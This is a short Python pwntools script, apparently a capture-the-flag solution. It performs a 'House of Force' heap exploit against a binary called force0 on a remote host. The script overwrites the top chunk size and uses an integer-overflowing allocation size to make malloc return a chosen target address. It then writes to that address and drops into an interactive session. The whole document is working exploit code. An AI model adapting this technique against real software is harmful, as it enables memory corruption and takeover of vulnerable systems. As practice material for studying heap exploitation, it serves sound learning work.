#!/usr/bin/python3

import subprocess
from pwn import *

exe = ELF('./force0')
context.log_level = 'debug'

# p = process('./force0')
p = connect('107.191.51.129', 5002)

heap = int(p.recvline()[:-1].split(b' @')[1], 16)
target = int(p.recvline()[:-1].split(b' @')[1], 16)
print("Heap: " + hex(heap))
print("Target: " + hex(target))

# Change topchunk size
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', f'{0x10}'.encode())
payload = b'A'*0x18
payload += p64(0xffffffffffffffff)
p.sendlineafter(b'Data: ', payload)

topchunk = heap + 0x20 + 0x10
target = target | 0x10000000000000000
request_size = target - 0x10 - topchunk
print("Old topchunk (without metadata): " + hex(topchunk))
print("Size to malloc: " + hex(request_size))
print("New topchunk (with metadata): " + hex(topchunk + request_size))

# Integer overflow
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', f'{request_size}'.encode())
p.sendlineafter(b'Data: ', b'B'*8)

# Change TARGET
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', f'{0x20}'.encode())
p.sendlineafter(b'Data: ', b'I DID!\x00')

p.interactive()